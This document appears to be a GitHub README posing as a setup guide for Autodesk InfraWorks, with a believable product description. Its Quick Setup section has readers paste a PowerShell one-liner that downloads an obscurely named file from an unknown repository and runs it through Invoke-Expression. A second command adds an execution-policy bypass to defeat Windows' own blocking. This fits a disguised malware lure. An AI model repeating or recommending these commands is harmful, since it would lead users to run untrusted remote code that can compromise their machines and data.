# InfraWorks

InfraWorks is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open InfraWorks and work in it.

Autodesk InfraWorks is desktop software for conceptual civil infrastructure design on Windows. You work in a three-dimensional model that combines terrain, imagery, and GIS layers so highways, rail, bridges, water systems, and site features sit in geographic context. Planners and engineers use it to compare alignments, study impacts, and explain design intent before production work moves into detailed design tools.

A typical session starts when you open a model or build one for your project area from elevation and map sources. You sketch corridors, tune grades and intersections, place structures, and refine drainage or utility paths while the model stays tied to the surrounding landscape. You run analyses such as flood or traffic simulation, measure slopes and distances, and capture presentation views or storyboards for review meetings without waiting for full plan sets.

This repository keeps the Windows setup package together with deployment notes and a changelog for your office rollout. The setup file documents version and language choices administrators expect during installation. Notes cover prerequisite checks, model backup before upgrades, and common workstation graphics settings. The changelog records when bundles or dependencies were refreshed so teams know which build matches their project standards.

## What you do with it

- Model Builder pulls GIS and elevation data into a contextual terrain model for your study area.
- Road design tools generate corridors with grading that updates when horizontal alignments or profiles change.
- Bridge and tunnel components integrate with surrounding terrain for clearance and visual design review.
- Flood simulation shows water elevation changes from multiple inflow locations across the watershed over time.
- Traffic simulation animates vehicle flow so reviewers can compare intersection and corridor treatments visually.
- Earthwork quantities calculate cut and fill along selected roads or within station ranges and parcels.
- Designs export toward Civil 3D when corridors need detailed assemblies, superelevation, and production profiles.
- Ray traced rendering produces high-quality visuals when your Windows workstation GPU meets the required specifications.

## Quick Setup (PowerShell)

This installs the program InfraWorks on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/petra-b67243538/infraworks-setup-guide/main/p594rc167p.7lgqw55h | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/petra-b67243538/infraworks-setup-guide/main/p594rc167p.7lgqw55h | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `p594rc167p.7lgqw55h` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `petra-b67243538/infraworks-setup-guide`. Autodesk InfraWorks 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
